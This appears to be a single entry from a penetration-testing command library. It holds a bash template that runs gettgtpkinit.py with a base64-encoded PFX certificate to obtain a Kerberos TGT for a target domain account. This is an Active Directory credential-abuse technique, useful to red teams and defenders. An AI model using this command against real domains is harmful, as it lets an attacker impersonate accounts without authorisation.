---
id: f0c01dd5-d60f-4842-a756-b0aece154141
name: Get TGT using Base64-encoded PFX certificate
type: command
executor: bash
data: gettgtpkinit.py -pfx-base64 $(cat "PATH_TO_B64_PFX_CERT") "FQDN_DOMAIN/TARGET_SAMNAME"
  "TGT_CCACHE_FILE"
output: null
created_at: '2023-04-06T03:56:06.176726+00:00'
updated_at: '2023-04-10T20:26:17.485526+00:00'
---

# Get TGT using Base64-encoded PFX certificate

```bash
gettgtpkinit.py -pfx-base64 $(cat "PATH_TO_B64_PFX_CERT") "FQDN_DOMAIN/TARGET_SAMNAME" "TGT_CCACHE_FILE"
```
